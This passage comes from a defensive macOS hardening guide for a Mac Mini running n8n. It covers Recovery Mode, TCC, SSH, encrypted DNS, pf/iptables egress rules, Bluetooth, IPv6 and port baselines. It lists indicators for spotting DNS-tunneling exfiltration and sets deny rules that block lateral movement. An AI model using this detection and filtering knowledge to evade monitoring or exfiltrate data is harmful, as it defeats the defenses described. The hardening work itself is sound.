| Configuration profiles blocked | Cannot install profiles from untrusted sources | Benefit: blocks profile-based attacks (§2.10) |

**Recommendation**: Enable Lockdown Mode if you manage the Mac Mini exclusively via SSH from a separate machine. Test on a non-production instance first if you access the n8n web UI locally.

#### Verification

```bash
# No CLI command to check Lockdown Mode status reliably
# Check via System Settings > Privacy & Security > Lockdown Mode
```

#### Edge Cases and Warnings

- **Not reversible without restart**: Enabling or disabling Lockdown Mode requires a system restart.
- **Docker/Colima**: Compatibility with Docker and Colima is undocumented by Apple. Test container operations before enabling on a production server.
- **Webhook ingress**: Lockdown Mode blocks incoming connections from unknown devices. If n8n receives webhooks from the internet, use a reverse proxy (§5.8) to avoid issues.
- **Homebrew tools**: JIT restrictions may affect some tools. Verify critical CLI tools work after enabling.

### 2.9 Recovery Mode Password

**Threat**: Physical attacker boots into Recovery Mode to reset passwords, disable FileVault, or modify the system volume
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple Platform Security — Startup security](https://support.apple.com/guide/security/startup-security-sec1ea214c99/web)

#### Why This Matters

Recovery Mode provides powerful administrative capabilities — resetting user passwords, disabling SIP, modifying the system volume, and on Intel Macs without a firmware password, accessing Target Disk Mode to read the drive directly. Startup security settings prevent unauthorized use of these capabilities.

#### How to Harden

`[EDUCATIONAL]` — Recovery Mode hardening depends on hardware generation.

**Apple Silicon (M1/M2/M3/M4):**

Apple Silicon Macs require administrator authentication to enter Recovery Mode — this is enforced by the Secure Enclave and cannot be bypassed via software.

```bash
# Verify Secure Boot is set to Full Security
# Boot to Recovery > Startup Security Utility
# Ensure "Full Security" is selected (default)
```

Full Security ensures:

- Only the current, signed macOS version can boot
- External boot media is blocked unless explicitly allowed
- Recovery Mode requires administrator authentication

**Intel Macs:**

Set a firmware password to prevent unauthorized Recovery Mode access, Target Disk Mode, and external media boot:

```bash
# Boot to Recovery Mode (Cmd+R during startup)
# Open Utilities > Startup Security Utility (or Firmware Password Utility)
# Set a strong firmware password
```

> **WARNING**: If you forget the firmware password on an Intel Mac, there is no self-service recovery. Apple Store or Authorized Service Provider intervention is required.

**Target Disk Mode / Mac Sharing Mode:**

| Feature | Intel | Apple Silicon |
|---------|-------|---------------|
| Target Disk Mode | Prevented by firmware password; FileVault encrypts disk | Replaced by Mac Sharing Mode |
| Mac Sharing Mode | N/A | Requires administrator authentication |
| DFU Mode | N/A | Erases all data; Activation Lock (Find My Mac) is defense |

#### Verification

```bash
# Apple Silicon: verify startup security (must check in Recovery Mode)
# No reliable CLI check from normal boot

# Intel: check firmware password status
sudo firmwarepasswd -check 2>/dev/null || echo "Not applicable (Apple Silicon)"
# Expected (Intel): "Password Enabled: Yes"
```

#### Edge Cases and Warnings

- **DFU Mode (Apple Silicon)**: Device Firmware Update mode allows firmware-level restore and erases all data. It bypasses all software security. Defense: FileVault protects data at rest, and Find My Mac's Activation Lock (§9.5) prevents the device from being set up by a thief.
- **Single User Mode**: Disabled by SIP on Catalina and later. Unavailable on Apple Silicon.
- **Firmware password vs FileVault**: A firmware password prevents booting from external media. FileVault prevents reading data from the disk. Both are needed on Intel Macs.

**Audit check**: `CHK-STARTUP-SECURITY` (WARN) → §2.9

### 2.10 System Privacy and TCC

**Threat**: Consumer-oriented features leak data to Apple servers; excessive TCC permissions give n8n (or an attacker exploiting n8n) access to the camera, microphone, contacts, and full disk; configuration profiles silently modify security settings; Spotlight indexes expose PII to rapid search
**Layer**: Prevent
**Deployment**: Both
**Source**: [Apple — Control app access to files, folders, and more](https://support.apple.com/guide/mac-help/control-access-to-files-and-folders-on-mac-mchld5a35146/mac), [CIS Apple macOS Benchmark — 2.5, 2.6](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

macOS privacy features (Spotlight Suggestions, Siri, diagnostics sharing, Location Services) send data to Apple's servers — unnecessary on a headless server and potentially leaking information about installed tools and usage patterns. TCC (Transparency, Consent, and Control) governs which applications can access sensitive resources. If n8n runs under an account with Full Disk Access, a Code node exploit can read any file on the system. Configuration profiles can silently modify security settings including FileVault and certificate trust. Spotlight indexes all file contents by default, letting any process rapidly search for credentials and PII.

#### How to Harden

**Disable unnecessary privacy-leaking features:**

```bash
# Disable Spotlight Suggestions (sends search queries to Apple)
defaults write com.apple.spotlight orderedItems -array \
  '{"enabled" = 0; "name" = "MENU_SPOTLIGHT_SUGGESTIONS";}' \
  '{"enabled" = 0; "name" = "MENU_WEBSEARCH";}'

# Disable diagnostics sharing with Apple
defaults write /Library/Application\ Support/CrashReporter/DiagnosticMessagesHistory.plist AutoSubmit -bool false

# Disable Siri (no function on headless server)
defaults write com.apple.assistant.support "Assistant Enabled" -bool false

# Disable Location Services (unless needed for Find My Mac)
# Note: Find My Mac requires Location Services — see §9.5
sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.locationd.plist 2>/dev/null || true

# Disable ad tracking
defaults write com.apple.AdLib forceLimitAdTracking -bool true
```

**Audit and restrict TCC permissions:**

```bash
# List all TCC permission grants (requires Full Disk Access for the terminal)
# Bare-metal: verify n8n service account has NO sensitive permissions
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, service, auth_value FROM access WHERE auth_value = 2;" 2>/dev/null || \
  echo "TCC database requires Full Disk Access to read"

# Reset permissions for a specific application
tccutil reset All com.example.appbundleid
```

**TCC by deployment path:**

- **Containerized**: Docker containers do not interact with TCC directly — container isolation provides the boundary. Verify the Colima VM user does not have unnecessary TCC grants.
- **Bare-metal**: n8n inherits the TCC permissions of the user account running it. If running as a dedicated service account (§6.1), that account should have zero TCC permissions granted.

> **Tahoe (macOS 26)**: TCC enforcement is stricter. Terminal with Full Disk Access grants FDA to all scripts run from that terminal. Avoid granting FDA to Terminal on production servers.

**Disable core dumps:**

```bash
# Disable core dumps system-wide (prevents credential leakage via process memory dumps)
sudo launchctl limit core 0

# Verify no existing core files
ls -la /cores/ 2>/dev/null
# Expected: empty or "No such file or directory"
```

**Containerized core dump prevention:**

Add to `docker-compose.yml` (see §4.3):

```yaml
ulimits:
  core:
    soft: 0
    hard: 0
```

**Audit configuration profiles:**

```bash
# List installed configuration profiles
profiles list 2>/dev/null || echo "No profiles installed"

# WARN: Any unexpected profile is suspicious
# Profiles can modify FileVault, install root CAs, change DNS, configure VPN
# Remove unauthorized profiles:
# sudo profiles remove -identifier <profile-id>
```

**Exclude sensitive directories from Spotlight indexing:**

```bash
# Disable Spotlight indexing for n8n data directory
# Bare-metal:
sudo mdutil -i off /path/to/n8n/data

# Docker volume mount points (if mounted on host):
sudo mdutil -i off /path/to/docker/volumes

# Colima VM data:
sudo mdutil -i off ~/.colima

# Rebuild index to remove previously indexed sensitive data
sudo mdutil -E /
```

**Harden hibernation (headless servers):**

```bash
# Disable hibernation (prevents RAM image writes to disk)
sudo pmset -a hibernatemode 0

# Remove existing sleep image
sudo rm -f /private/var/vm/sleepimage

# Create empty, immutable file to prevent recreation
sudo touch /private/var/vm/sleepimage
sudo chflags uchg /private/var/vm/sleepimage
```

**Harden temp file and cache security:**

```bash
# Verify /tmp permissions
ls -la /private/tmp
# Expected: drwxrwxrwt (sticky bit set)

# Bare-metal: restrict n8n service account temp directory
# (Created by macOS in /var/folders/ — permissions inherited from account)

# Clear browser cache if n8n UI was accessed locally
# Use Private Browsing when accessing n8n web UI from the Mac itself
```

#### Verification

```bash
# Verify Siri is disabled
defaults read com.apple.assistant.support "Assistant Enabled" 2>/dev/null
# Expected: 0

# Verify diagnostics sharing is disabled
defaults read /Library/Application\ Support/CrashReporter/DiagnosticMessagesHistory.plist AutoSubmit 2>/dev/null
# Expected: 0

# Verify no core files exist
ls /cores/ 2>/dev/null | wc -l
# Expected: 0

# Verify core dumps disabled
launchctl limit core 2>/dev/null
# Expected: core 0 0

# Check for configuration profiles
profiles list 2>/dev/null
# Expected: empty or only known/expected profiles

# Verify Spotlight exclusions
mdutil -s /path/to/n8n/data 2>/dev/null
# Expected: "Indexing disabled."
```

#### Edge Cases and Warnings

- **Location Services and Find My Mac**: Disabling Location Services disables Find My Mac. If physical security (§9.5) relies on Find My Mac for remote wipe, keep Location Services enabled but restrict it to only Find My Mac.
- **TCC database access**: Reading the TCC database requires Full Disk Access for the querying process. The audit script will attempt to check TCC but may report SKIP if permissions are insufficient.
- **Spotlight exclusion timing**: Adding Spotlight exclusions does not remove previously indexed data. You must rebuild the index (`mdutil -E /`) to purge stale entries containing PII.
- **Configuration profiles**: Legitimate management software (MDM) may install profiles. Verify with your IT department before removing profiles you don't recognize.
- **Tahoe TCC changes**: On Tahoe, the Local Network Privacy prompt is more strictly enforced, which may affect network operations. Test after upgrading.
- **Docker build cache**: If using custom Dockerfiles, `docker builder prune` removes cached layers that may contain sensitive data. See §4.4.

**Audit checks**: `CHK-TCC` (WARN), `CHK-CORE-DUMPS` (WARN), `CHK-PRIVACY` (WARN), `CHK-PROFILES` (WARN), `CHK-SPOTLIGHT` (WARN) → §2.10

---

## 3. Network Security (Prevent)

### 3.1 SSH Hardening

**Threat**: LAN attacker brute-forces SSH passwords or exploits weak SSH configuration to gain remote shell access
**Layer**: Prevent
**Deployment**: Both
**Source**: [CIS Apple macOS Benchmark — 2.3.3](https://www.cisecurity.org/benchmark/apple_os), [NIST SP 800-123 §4.2](https://csrc.nist.gov/publications/detail/sp/800-123/final)

#### Why This Matters

SSH is the primary remote management path for a headless Mac Mini. Default macOS SSH configuration allows password authentication, which is vulnerable to brute force attacks from any device on the LAN. A compromised SSH session gives full shell access — equivalent to sitting at the keyboard.

#### How to Harden

> **WARNING**: Install and test your SSH key BEFORE disabling password authentication. If you disable password auth without a working key, you are locked out of a headless server and must use physical access or Screen Sharing to recover.

**Step 1 — Generate an ed25519 key on your client machine:**

```bash
# On your management workstation (NOT the Mac Mini)
ssh-keygen -t ed25519 -C "operator@mac-mini"
```

**Step 2 — Copy the public key to the Mac Mini:**

```bash
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@mac-mini-ip
```

**Step 3 — Test key-based login before changing anything:**

```bash
ssh -i ~/.ssh/id_ed25519 user@mac-mini-ip
```

**Step 4 — Harden sshd_config:**

```bash
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup
sudo tee /etc/ssh/sshd_config.d/hardening.conf > /dev/null << 'SSHEOF'
# Key-only authentication (disable password brute force)
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM no

# Disable root login
PermitRootLogin no

# Restrict to specific users
AllowUsers your-username

# Modern key exchange and ciphers
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com

# Idle session timeout (5 minutes)
ClientAliveInterval 300
ClientAliveCountMax 0

# Disable agent and X11 forwarding (not needed on server)
AllowAgentForwarding no
X11Forwarding no
SSHEOF
```

**Step 5 — Restart the SSH daemon:**

```bash
sudo launchctl stop com.openssh.sshd
sudo launchctl start com.openssh.sshd
```

**Step 6 — Test from a NEW terminal (keep current session open as fallback):**

```bash
ssh -i ~/.ssh/id_ed25519 user@mac-mini-ip
```

**If SSH is not needed** (manage exclusively via Screen Sharing or physical access):

```bash
sudo systemsetup -setremotelogin off
```

**Containerized path**: Never enable SSH inside containers. Use `docker exec` from the host for container management.

#### Verification

```bash
# Verify password auth is disabled
sshd -T 2>/dev/null | grep passwordauthentication
# Expected: passwordauthentication no

# Verify root login is disabled
sshd -T 2>/dev/null | grep permitrootlogin
# Expected: permitrootlogin no

# Verify SSH is listening (if enabled)
sudo lsof -iTCP:22 -sTCP:LISTEN -P -n 2>/dev/null
```

#### Edge Cases and Warnings

- **Lockout recovery**: If locked out, boot into Recovery Mode, mount the disk, and edit `/etc/ssh/sshd_config.d/hardening.conf` to re-enable password auth temporarily. Or use Screen Sharing if it was left enabled.
- **macOS updates**: Major macOS updates can reset sshd_config. Using a `.d/` drop-in file (`sshd_config.d/hardening.conf`) is more resilient than editing the main config.
- **Multiple operators**: If multiple people need SSH access, add all usernames to `AllowUsers` separated by spaces.
- **Port changes**: Changing the SSH port from 22 is not recommended — it adds minimal security (trivially discovered by port scanning) and complicates tooling.

**Audit checks**: `CHK-SSH-KEY-ONLY` (FAIL), `CHK-SSH-ROOT` (FAIL) → §3.1

### 3.2 DNS Security

**Threat**: LAN attacker observes DNS queries to map services in use, or spoofs DNS responses to redirect traffic to attacker infrastructure; compromised n8n exfiltrates data via DNS tunneling
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-81 Rev 2](https://csrc.nist.gov/publications/detail/sp/800-81/2/final), [Apple Platform Security — Encrypted DNS](https://support.apple.com/guide/security/networking-sec9230ff994/web)

#### Why This Matters

Without encrypted DNS, any device on the LAN can observe every DNS query the Mac Mini makes — revealing which APIs it calls (LinkedIn, Apify, SMTP relay), which tools it updates (Homebrew, npm), and what services it communicates with. A LAN attacker can also spoof DNS responses to redirect traffic to malicious endpoints. DNS tunneling is a data exfiltration technique that bypasses most outbound filtering because DNS traffic is typically allowed.

#### How to Harden

**Configure encrypted DNS (DoH/DoT) via Quad9:**

macOS Monterey and later support encrypted DNS natively via configuration profiles. Create and install a DNS profile:

```bash
# Create a DNS profile for Quad9 DoH
cat > /tmp/quad9-doh.mobileconfig << 'DNSEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>DNSSettings</key>
            <dict>
                <key>DNSProtocol</key>
                <string>HTTPS</string>
                <key>ServerURL</key>
                <string>https://dns.quad9.net/dns-query</string>
                <key>ServerAddresses</key>
                <array>
                    <string>9.9.9.9</string>
                    <string>149.112.112.112</string>
                </array>
            </dict>
            <key>PayloadType</key>
            <string>com.apple.dnsSettings.managed</string>
            <key>PayloadIdentifier</key>
            <string>com.openclaw.dns</string>
            <key>PayloadUUID</key>
            <string>A1B2C3D4-E5F6-7890-ABCD-EF1234567890</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Quad9 Encrypted DNS</string>
    <key>PayloadIdentifier</key>
    <string>com.openclaw.dns.profile</string>
    <key>PayloadUUID</key>
    <string>F1E2D3C4-B5A6-7890-1234-567890ABCDEF</string>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
DNSEOF

# Install the profile (will prompt for confirmation)
open /tmp/quad9-doh.mobileconfig
# Then approve in System Settings > Privacy & Security > Profiles
```

**DNS provider comparison:**

| Provider | Protocol | Malware Blocking | Cost | Privacy |
|----------|----------|-----------------|------|---------|
| **Quad9** (recommended) | DoH, DoT | Yes — blocks known malicious domains | Free | Swiss privacy law, no logging |
| Cloudflare 1.1.1.1 | DoH, DoT | Optional (1.1.1.2 for malware blocking) | Free | Fast, minimal logging |

**Container DNS configuration:**

Docker containers resolve DNS through the Colima VM's resolver by default. To ensure containers use encrypted DNS, configure the DNS servers in `docker-compose.yml`:

```yaml
services:
  n8n:
    dns:
      - 9.9.9.9
      - 149.112.112.112
```

**Enable DNS query logging for exfiltration detection:**

```bash
# Enable detailed DNS logging (mDNSResponder)
sudo log config --subsystem com.apple.mDNSResponder --mode level:debug

# Query DNS logs for anomalous patterns
log show --predicate 'subsystem == "com.apple.mDNSResponder"' --last 1h --info \
  | grep -E 'query.*\.' | head -20
```

**DNS exfiltration indicators to watch for:**

- High volume of queries to a single uncommon domain
- Subdomain labels longer than 30 characters with high-entropy content (base64/hex)
- Repeated queries to newly registered or uncommon TLDs
- Queries from n8n containers to domains not in the expected list (LinkedIn, Apify, SMTP relay)

> **NOTE**: Encrypted DNS (DoH/DoT) protects queries in transit from LAN eavesdroppers but does NOT prevent DNS exfiltration — the queries still reach the DNS provider who resolves them normally.

#### Verification

```bash
# Check configured DNS servers
scutil --dns | grep nameserver | head -5

# Verify DNS profile is installed
profiles list 2>/dev/null | grep -i dns

# Test encrypted DNS is working (should resolve without leaking to LAN)
nslookup example.com
```

#### Edge Cases and Warnings

- **DNS profile and Lockdown Mode**: If Lockdown Mode (§2.8) is enabled, configuration profile installation from untrusted sources is blocked. Install the DNS profile before enabling Lockdown Mode.
- **Split-horizon DNS**: If your network uses internal DNS for local resources, the encrypted DNS profile may break local name resolution. Configure split DNS via the profile's `SupplementalMatchDomains`.
- **Container DNS isolation**: Docker containers bypass the host's DNS profile by default. Always configure DNS explicitly in `docker-compose.yml`.

**Audit checks**: `CHK-DNS-ENCRYPTED` (WARN) → §3.2

### 3.3 Outbound Filtering

**Threat**: Compromised n8n exfiltrates credentials or PII via outbound connections to attacker-controlled servers; compromised Mac Mini pivots to other LAN devices
**Layer**: Prevent
**Deployment**: Both (different approaches per deployment path)
**Source**: [NIST SP 800-41 Rev 1](https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final), [MITRE ATT&CK T1041 — Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)

#### Why This Matters

The macOS application firewall (§2.2) blocks **inbound** connections only — it provides zero protection against outbound data theft. If an attacker compromises n8n via injection (§5.6), they will attempt to exfiltrate credentials, PII, and workflow data through outbound HTTP/HTTPS connections to attacker-controlled servers. Without outbound filtering, nothing stops this. Additionally, a compromised Mac Mini becomes a pivot point for lateral movement to other LAN devices.

#### How to Harden

##### Bare-Metal Path

**Option 1 — macOS pf (packet filter) for outbound allowlisting:**

Create a starter pf ruleset that allows only known required destinations:

```bash
sudo tee /etc/pf.anchors/openclaw-outbound > /dev/null << 'PFEOF'
# OpenClaw outbound filtering rules
# Allow loopback
pass out quick on lo0 all

# Allow established connections
pass out quick flags S/SA keep state

# Allow DNS (to encrypted DNS resolver)
pass out quick proto udp to 9.9.9.9 port 53
pass out quick proto udp to 149.112.112.112 port 53
pass out quick proto tcp to 9.9.9.9 port 443
pass out quick proto tcp to 149.112.112.112 port 443

# Allow HTTPS to known services
# Adjust these IPs/ranges for your specific providers
pass out quick proto tcp to any port 443

# Allow SSH outbound (for git, remote management)
pass out quick proto tcp to any port 22

# Allow NTP
pass out quick proto udp to any port 123

# Block and log everything else
block out log all
PFEOF

# Load the anchor into pf.conf
sudo cp /etc/pf.conf /etc/pf.conf.backup
echo 'anchor "openclaw-outbound"' | sudo tee -a /etc/pf.conf
echo 'load anchor "openclaw-outbound" from "/etc/pf.anchors/openclaw-outbound"' | sudo tee -a /etc/pf.conf

# Enable pf
sudo pfctl -ef /etc/pf.conf
```

> **NOTE**: The starter ruleset above is permissive (allows all port 443). Tighten it by replacing `to any port 443` with specific IP ranges for LinkedIn, Apify, your SMTP relay, and Homebrew CDNs as you identify them in production.

**Option 2 — LuLu (free, open source, interactive):**

LuLu provides per-application outbound filtering with interactive allow/deny prompts. Recommended for operators who prefer interactive control over static pf rules.

```bash
# Install LuLu via Homebrew
brew install --cask lulu
```

LuLu alerts on every new outbound connection attempt and lets you allow or block per application. After an initial learning period, it builds an allowlist of legitimate traffic.

**Option 3 — Little Snitch `[PAID]` ~$59 one-time:**

Little Snitch provides advanced per-application outbound filtering with network visualization, per-connection rules, and automatic profile switching. It adds over LuLu:

- Real-time network traffic visualization map
- Per-connection rules (not just per-application)
- Silent mode for automatic allow/deny based on rules
- Network profile switching (e.g., different rules for home vs office)

Use Little Snitch if you need granular per-connection rules or the network visualization for monitoring.

##### Containerized Path

macOS pf **cannot** directly filter container traffic — container traffic is NAT'd through the Colima VM's networking stack. For containerized deployments, configure outbound filtering **inside the Colima VM** using iptables via a Lima provisioning script:

```bash
# Edit Colima configuration
# Location: ~/.colima/default/colima.yaml (or ~/.colima/<profile>/colima.yaml)
```

Add a provisioning script to `colima.yaml`:

```yaml
provision:
  - mode: system
    script: |
      # Allow established connections
      iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
      # Allow loopback
      iptables -A OUTPUT -o lo -j ACCEPT
      # Allow DNS
      iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
      # Allow HTTPS to external services
      iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
      # Allow container-to-host communication (Docker bridge)
      iptables -A OUTPUT -d 192.168.5.0/24 -j ACCEPT
      # Block RFC 1918 ranges (SSRF defense — prevent container reaching LAN)
      iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
      iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
      iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
      # Allow everything else (tighten as needed)
      iptables -A OUTPUT -j ACCEPT
```

> **WARNING**: `colima delete` destroys this configuration. Back up your `colima.yaml` in version control.

LuLu on the host can also monitor the Colima/QEMU process for a coarse all-or-nothing view of container network activity.

**Lateral movement defense (both paths):**

Outbound filtering is your primary defense against a compromised Mac Mini pivoting to LAN devices. The pf rules (bare-metal) or iptables rules (containerized) above block access to RFC 1918 ranges. Additionally:

- **Network segmentation**: Place the Mac Mini on a dedicated VLAN or subnet if your router supports it — this is the single most effective lateral movement control. If VLANs are unavailable, the pf/iptables rules above are the fallback.
- **Wi-Fi vs Ethernet**: Use wired Ethernet — Wi-Fi adds attack surface (deauthentication attacks, evil twin APs, WPA key compromise) unnecessary for a headless server.

```bash
# If Wi-Fi is not needed, disable it
networksetup -setairportpower en0 off
```

#### Verification

```bash
# Verify pf is enabled and rules are loaded (bare-metal)
sudo pfctl -sr 2>/dev/null | head -20

# Verify LuLu is running
pgrep -f LuLu

# Check iptables rules inside Colima VM (containerized)
colima ssh -- sudo iptables -L -n 2>/dev/null
```

#### Edge Cases and Warnings

- **pf persistence**: pf rules are lost on reboot unless loaded from `/etc/pf.conf`. The configuration above persists across reboots.
- **Colima restart**: iptables rules inside the VM persist across `colima stop/start` but are lost on `colima delete`. The provisioning script re-applies them on every `colima start`.
- **SSRF defense**: The iptables rules blocking RFC 1918 ranges prevent n8n containers from reaching internal LAN services via SSRF. See §7.5 for additional SSRF controls.
- **macOS updates**: Verify pf rules survive macOS upgrades — back up `/etc/pf.anchors/` and `/etc/pf.conf`.
- **mDNS/Bonjour**: Disabling outbound mDNS reduces the Mac Mini's visibility on the LAN. mDNS uses UDP port 5353 — the pf rules above block it by default when the final `block out log all` rule is active.

**Audit checks**: `CHK-OUTBOUND-FILTER` (WARN) → §3.3

### 3.4 Bluetooth

**Threat**: Nearby attacker exploits Bluetooth vulnerabilities or uses Bluetooth sharing to transfer malicious files
**Layer**: Prevent
**Deployment**: Both
**Source**: [CIS Apple macOS Benchmark — 2.1.1](https://www.cisecurity.org/benchmark/apple_os)

#### Why This Matters

Bluetooth adds wireless attack surface within physical proximity (~30 feet). Historical Bluetooth vulnerabilities (BlueBorne, KNOB attack) have enabled remote code execution without user interaction. On a headless server, Bluetooth is unnecessary unless a wireless keyboard or mouse is attached.

#### How to Harden

**If Bluetooth keyboard/mouse is needed** (keep on, reduce attack surface):

```bash
# Disable Bluetooth Sharing
defaults -currentHost write com.apple.bluetooth PrefKeyServicesEnabled -bool false

# Disable Bluetooth discoverability (prevents new device pairing prompts)
sudo defaults write /Library/Preferences/com.apple.Bluetooth DiscoverableState -bool false

# Disable Handoff (uses Bluetooth LE for cross-device features)
defaults -currentHost write com.apple.coreservices.useractivityd ActivityAdvertisingAllowed -bool false
```

**If no Bluetooth peripherals are needed:**

```bash
# Disable Bluetooth entirely
sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 0
sudo killall -HUP bluetoothd
```

#### Verification

```bash
# Check Bluetooth power state
defaults read /Library/Preferences/com.apple.Bluetooth ControllerPowerState 2>/dev/null
# Expected: 0 (off) or 1 (on)

# Check discoverability
sudo defaults read /Library/Preferences/com.apple.Bluetooth DiscoverableState 2>/dev/null
# Expected: 0
```

#### Edge Cases and Warnings

- **Wireless keyboard/mouse**: If using Bluetooth input devices on the Mac Mini, keep Bluetooth enabled but disable discoverability and sharing. New device pairing requires re-enabling discoverability temporarily.
- **macOS updates**: Bluetooth settings may reset after macOS updates. Re-verify after upgrades.

**Audit check**: `CHK-BLUETOOTH` (WARN) → §3.4

### 3.5 IPv6

**Threat**: Attacker bypasses IPv4-only firewall rules by communicating over IPv6; rogue router advertisements (RA) redirect traffic
**Layer**: Prevent
**Deployment**: Both
**Source**: [NIST SP 800-119](https://csrc.nist.gov/publications/detail/sp/800-119/final), [MITRE ATT&CK T1557.002 — ARP Cache Poisoning (IPv6 RA variant)](https://attack.mitre.org/techniques/T1557/002/)

#### Why This Matters

macOS application firewall and many pf rulesets filter only IPv4 traffic by default. If IPv6 is enabled without corresponding firewall rules, the entire firewall is bypassed for IPv6 traffic. IPv6 router advertisement (RA) attacks can redirect traffic through an attacker on the LAN without any authentication. For most home/office server deployments, IPv6 is not required.

#### How to Harden

**Recommended: Disable IPv6 if not required (safest default):**

```bash
# List active network interfaces
networksetup -listallnetworkservices

# Disable IPv6 on each active interface
networksetup -setv6off "Ethernet"
networksetup -setv6off "Wi-Fi"
```

**If IPv6 is required** (ISP mandates it or specific services need it):

```bash
# Add IPv6 pf rules alongside your IPv4 rules
# In your pf anchor file (e.g., /etc/pf.anchors/openclaw-outbound):
# Use 'inet6' address family for IPv6 rules
# block in quick on en0 inet6 from any to any
# pass out quick inet6 proto tcp to any port 443

# Disable IPv6 privacy extensions (simplifies logging/forensics)
sudo sysctl -w net.inet6.ip6.use_tempaddr=0

# Disable IPv6 router advertisement acceptance (if using static IPv6)
sudo sysctl -w net.inet6.ip6.accept_rtadv=0
```

**Container implications**: Docker on Colima uses IPv4 by default for container networking. Verify IPv6 is not creating an unfiltered path:

```bash
colima ssh -- sysctl net.ipv6.conf.all.disable_ipv6 2>/dev/null
# Expected: 1 (disabled) — Colima VMs typically have IPv6 disabled
```

#### Verification

```bash
# Verify IPv6 is disabled on Ethernet
networksetup -getv6 "Ethernet"
# Expected: "IPv6: Off"

# If IPv6 is enabled, verify pf has IPv6 rules
sudo pfctl -sr 2>/dev/null | grep inet6
```

#### Edge Cases and Warnings

- **ISP requires IPv6**: Some ISPs require IPv6 for connectivity. Disable only if your network functions properly without it.
- **RA attacks**: IPv6 router advertisements are accepted by default and unauthenticated — a LAN attacker can become the default gateway. Disable RA acceptance if using static IPv6.
- **Dual-stack firewall**: If running dual-stack, ensure every IPv4 pf rule has an IPv6 equivalent. A common mistake is filtering only IPv4 while leaving IPv6 wide open.

**Audit check**: `CHK-IPV6` (WARN) → §3.5

### 3.6 Service Binding and Port Exposure

**Threat**: Unexpected services listen on network interfaces, exposing them to LAN attackers or the internet; services bound to 0.0.0.0 instead of 127.0.0.1 are accessible from any network
**Layer**: Prevent
**Deployment**: Both
**Source**: [CIS Apple macOS Benchmark — 2.3](https://www.cisecurity.org/benchmark/apple_os), [MITRE ATT&CK T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/)

#### Why This Matters

An attacker's first step is port scanning to discover what services are running. Any listening service is a potential entry point. Services that bind to `0.0.0.0` (all interfaces) are accessible from the entire LAN — and potentially the internet if the router forwards ports. Creating a listening service baseline after hardening lets you detect new services introduced by software installs, macOS updates, or attackers.

#### How to Harden

**Create a listening service baseline after initial hardening:**

```bash
# TCP listeners
sudo lsof -iTCP -sTCP:LISTEN -P -n > ~/baseline-listeners-tcp.txt

# UDP listeners
sudo lsof -iUDP -P -n > ~/baseline-listeners-udp.txt

# Cross-check with netstat
sudo netstat -an | grep LISTEN >> ~/baseline-listeners-tcp.txt

# Store baseline securely (restrict permissions)
chmod 600 ~/baseline-listeners-*.txt
```

**Expected services by deployment path:**

| Service | Port | Binding | Containerized | Bare-Metal |
|---------|------|---------|---------------|------------|
| SSH (if enabled) | 22 | 0.0.0.0 (hardened per §3.1) | Expected | Expected |
| n8n | 5678 | 127.0.0.1 only | Via Docker port mapping | Direct |
| Colima/Docker | Various | 127.0.0.1 | Expected | N/A |

Any service not in this table is unexpected and requires investigation.

**Investigate unexpected listeners:**

```bash
# Find what process owns a specific port
sudo lsof -i :PORT_NUMBER

# Check process details
ps aux | grep PID_NUMBER
```

**Triage procedure for unexpected services:**

1. Identify the process name and path
2. Determine if it's a macOS system service, installed tool, or unknown binary
3. If unknown or suspicious → follow incident response (§9.1)
4. If legitimate but unnecessary → disable and document

**Container port binding verification:**

```bash
# Verify all Docker port mappings bind to 127.0.0.1
docker port $(docker ps -q --filter "name=n8n") 2>/dev/null
# Expected: 5678/tcp -> 127.0.0.1:5678

# FAIL if any port shows 0.0.0.0
docker inspect --format='{{range $p, $conf := .NetworkSettings.Ports}}{{$p}} -> {{(index $conf 0).HostIp}}:{{(index $conf 0).HostPort}}{{"\n"}}{{end}}' $(docker ps -q --filter "name=n8n") 2>/dev/null
```

**Reduce LAN discoverability:**

```bash
# Disable AirDrop (already done in §2.7, verify here)
defaults read com.apple.NetworkBrowser DisableAirDrop 2>/dev/null
# Expected: 1

# Verify mDNS advertisement is minimal
# mDNS is used by Bonjour — disabling sharing services (§2.7) reduces advertisements
# but mDNSResponder still runs. No supported way to fully disable mDNSResponder.
```

#### Verification

```bash
# Compare current listeners against baseline
diff <(sudo lsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null | awk '{print $1, $9}' | sort) \
     <(cat ~/baseline-listeners-tcp.txt | awk '{print $1, $9}' | sort) || echo "Changes detected"

# Quick check: any service on 0.0.0.0 that shouldn't be?
sudo lsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null | grep '0.0.0.0\|*:' | grep -v sshd
# Expected: empty (n8n should be on 127.0.0.1, not 0.0.0.0)
```

#### Edge Cases and Warnings

- **Baseline maintenance**: Recreate the baseline after legitimate software installations or configuration changes.
- **Ephemeral ports**: Some services use ephemeral ports that change on restart. Focus baseline comparison on the process name and well-known ports.
